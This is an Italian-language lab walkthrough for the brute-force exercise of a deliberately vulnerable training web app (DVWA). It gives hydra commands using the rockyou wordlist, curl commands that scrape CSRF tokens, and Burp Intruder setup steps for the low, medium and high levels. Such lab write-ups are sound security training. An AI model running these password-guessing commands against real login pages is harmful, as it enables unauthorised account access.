## Brute force

- https://owasp.org/www-community/attacks/Brute_force_attack
- http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password
- http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html

### Brute force - Low

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

```
$ hydra -l admin -P rockyou.txt \
	172.17.0.2 http-get-form \
	"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"
```

parametri http-get-form: `"<RELATIVE PATH>:<PARAMETERS>:<FAILED LOGIN TEXT>:H=Cookie: <REQUEST COOKIES>"`

### Brute force - Medium

```
// Login failed
sleep( 2 );
```

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

```
$ hydra -l admin -P rockyou.txt \
	localhost http-get-form \
	"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=medium" \
	-c 3 -t 1
```

### Brute force - High

```
// Check Anti-CSRF token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

...

// Login failed
sleep( rand( 0, 3 ) );
```

Exploit:

È necessario prima fare una GET per recuperare il CSRF token (`user_token`) e successivamente fare una seconda GET includendo il valore recuperato.

**curl**

- recupera un PHPSESSID valido (`$1`)

- ottieni il CSRF token

```
CSRF=$( curl -s --cookie "PHPSESSID=$1; security=high" 'http://172.17.0.2/vulnerabilities/brute/' | \
	awk -F 'value=' '/user_token/ {print $2}' | \
	cut -d "'" -f2)
```

- usalo nella richiesta di login

```
curl \
	--cookie "PHPSESSID=$1; security=high" \
	-L \
	-G -d "username=admin&password=password&user_token=$CSRF&Login=Login" \
	http://172.17.0.2/vulnerabilities/brute
```

**BurpSuite**

Configura Burp

- imposta il proxy Burp sul browser
- esegui un tentativo di login
- prepara l'Intruder
	- `Proxy` -> `HTTP History` -> trova la richiesta tramite cui hai eseguito il tentativo di login
	- Click destro -> `Send to Intruder`
	- `Intruder` -> `2` -> `Positions`
	- `Attack type`: `Pitchfork`
	- `Clear §`
	- nella query string per username impostare admin
	- Seleziona il valore della password nella query string -> `Add §`
	- Seleziona il valore del csrf token nella query string -> `Add §`
	- `Intruder` -> `2` -> `Payloads`
	- `Payload Sets` -> `Payload Sets`: `1` -> `Payload type`: `Simple list`
	- `Payload Options [Simple list]` -> `Load ...` : scegli wordlist di password
	- `Payload Sets` -> `Payload Sets`: `2` -> `Payload type`: `Recursive grep`
	- `Intruder` -> `2` -> `Options`
	- `Attack Results` -> disabilita `Make unmodified baseline request`
	- impostare l'estrazione del messaggio di output
		- `Grep` - `Extract` -> `Add`
		- Start after expression: `<pre><br />`
		- End at fixed lenght: `35`; per l'estrazione di `Username and/or password incorrect.`
		- `Ok`
	- impostare l'estrazione del csrf token
		- `Grep` - `Extract` -> `Add`
		- Start after expression: `name='user_token' value='`
		- End at fixed lenght: `32`
		- `Ok`
	- `Intruder` -> `2` -> `Payloads` -> `Payload Options [Recursive grep]` -> `FROM [name='user_token' value='], length 32` (la seconda regola Extract grep creata)
	- da browser ricaricare la pagina di login e inserire il csrf token in `Payload Options [Recursive grep]` -> `Initial payload for first request`
- lancia l'Intruder
	- `Intruder` -> `Target` -> `Start attack`

N.B. Per aggirare lo sleep rand a seguito di un tentativo di login errato avresti bisogno di Burp Professional (`Intruder` -> `2` -> `Options` -> `Request Engine` -> `Throttle` -> `Fixed`). Quindi l'attacco con Burp Community potrebbe non individuare la password valida.
